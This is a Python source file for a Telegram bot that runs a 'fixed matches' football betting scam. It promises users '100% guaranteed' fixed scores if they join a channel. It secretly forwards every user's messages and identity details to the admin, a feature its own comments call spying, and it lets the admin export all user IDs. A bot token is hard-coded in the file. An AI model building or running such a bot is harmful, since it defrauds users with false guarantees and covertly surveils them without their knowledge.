import telebot
import sqlite3
import os
from flask import Flask
from threading import Thread
from telebot import types

# --- Configuration / الإعدادات ---
TOKEN = "7225070696:AAEBSquEmyDCzz0o65GoVPHIG2Xk5qB"
ADMIN_ID = 8718991554
# ضروري تحط يوزر القناة هنا (مثال: @joseph_fixed) باش يخدم قفل الاشتراك
CHANNEL_USERNAME = "@YourChannelUsername" 
CHANNEL_URL = "https://t.me/+wZCOH72-1To3YWFk"

bot = telebot.TeleBot(TOKEN)

# --- Database / قاعدة البيانات ---
def init_db():
    conn = sqlite3.connect('bot_data.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)')
    conn.commit()
    conn.close()

def add_user(user_id):
    conn = sqlite3.connect('bot_data.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('INSERT OR IGNORE INTO users (user_id) VALUES (?)', (user_id,))
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect('bot_data.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('SELECT user_id FROM users')
    users = cursor.fetchall()
    conn.close()
    return [str(u[0]) for u in users]

# --- Subscription Check / فحص الاشتراك ---
def check_sub(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_USERNAME, user_id).status
        return status in ['member', 'administrator', 'creator']
    except:
        return False

# --- Flask Server (For Render stability) ---
app = Flask('')
@app.route('/')
def home(): return "JOSEPH FIXED BOT IS LIVE"
def run(): app.run(host='0.0.0.0', port=os.environ.get('PORT', 8080))
def keep_alive(): Thread(target=run).start()

# --- User Interface (ENGLISH) / واجهة المستخدم ---

@bot.message_handler(commands=['start'])
def welcome(message):
    user_id = message.from_user.id
    add_user(user_id)
    
    if not check_sub(user_id):
        markup = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton("JOIN CHANNEL NOW 📢", url=CHANNEL_URL)
        markup.add(btn)
        
        # رسالة ترحيب احترافية بالإنجليزية
        msg = (
            "Welcome to **JOSEPH FIXED MATCHES** ⚽️\n\n"
            "To get today's **100% GUARANTEED & SECURE** fixed scores, "
            "you must join our official channel first!\n\n"
            "👇 Click the button below to join:"
        )
        bot.send_message(user_id, msg, reply_markup=markup, parse_mode="Markdown")
    else:
        bot.send_message(user_id, "✅ **Access Granted!**\n\nYou are now a VIP member. Send the name of the match you want to get the fixed score for.", parse_mode="Markdown")

# --- Admin Interface (ARABIC) / واجهة الأدمن ---

@bot.message_handler(commands=['admin', 'users'])
def admin_panel(message):
    if message.from_user.id == ADMIN_ID:
        count = len(get_all_users())
        bot.reply_to(message, f"📊 **لوحة التحكم**\n\nعدد الناس اللي دخلوا للبوت: {count}\n\nصيفط /export باش تيليشارجي ملف الـ IDs.")

@bot.message_handler(commands=['export'])
def export_ids(message):
    if message.from_user.id == ADMIN_ID:
        users = get_all_users()
        with open("users_list.txt", "w") as f:
            for u in users: f.write(f"{u}\n")
        with open("users_list.txt", "rb") as f:
            bot.send_document(ADMIN_ID, f, caption="📄 هاد الملف فيه كاع الـ IDs ديال الناس اللي خدموا البوت.")
        os.remove("users_list.txt")

# --- Forwarding System / نظام التوجيه والتجسس ---

@bot.message_handler(func=lambda message: True, content_types=['text', 'photo', 'video', 'document', 'voice'])
def handle_messages(message):
    user_id = message.from_user.id
    add_user(user_id)
    
    if message.from_user.id == ADMIN_ID:
        return # الأدمن ما يتجسسش على راسو

    if check_sub(user_id):
        # توجيه للأدمن بالعربية
        info = (
            f"👁️ **رسالة جديدة من مستخدم:**\n"
            f"👤 السمية: {message.from_user.first_name}\n"
            f"🆔 الأيدي: `{user_id}`\n"
            f"🔗 اليوزر: @{message.from_user.username}\n"
            f"---"
        )
        bot.send_message(ADMIN_ID, info, parse_mode="Markdown")
        bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
        
        # رد تلقائي للمستخدم بالإنجليزية
        bot.send_message(user_id, "⏳ Your request is being processed... Please wait for the 100% guaranteed score.")
    else:
        welcome(message)

# --- Run ---
if __name__ == "__main__":
    init_db()
    keep_alive()
    print("Bot is running...")
    bot.infinity_polling()
